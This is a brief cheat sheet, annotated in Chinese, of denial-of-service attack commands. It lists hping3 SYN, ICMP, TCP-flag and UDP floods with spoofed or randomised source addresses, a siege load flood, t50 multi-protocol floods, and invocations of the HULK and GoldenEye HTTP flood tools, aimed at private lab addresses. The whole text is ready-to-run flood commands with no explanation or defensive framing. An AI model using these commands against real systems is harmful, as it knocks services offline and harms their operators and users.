###########Hping,Siege,T50##################################
hping3 -c 1000 -d 120 -S -w 64 -p 80 --flood --rand-source 10.10.10.132
hping3 -S -P -U -p 80 --flood --rand-source 10.10.10.132
icmp协议
hping3 -q -n -a 1.1.1.1 --icmp -d 200 --flood 10.10.10.132
tcp协议
hping3 -SARFUP -p 80 --flood --rand-source 10.10.10.132
udp_flood 攻击
hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood 10.10.10.132

siege -i -c 1000 http://10.10.10.132

t50 10.10.10.132 –flood –turbo -S –protocol TCP –dport 80
t50 10.10.10.132 –flood –turbo -S TCP UDP OSPF EIGRP –dport 22


HULK工具 GoldenEye工具
###############################################################
python hulk.py https://192.168.1.119
python goldeneye.py
帮助文档
python goldensye.py https://192.168.1.119 -w 50 -s 100 -m random 

#######################################################################
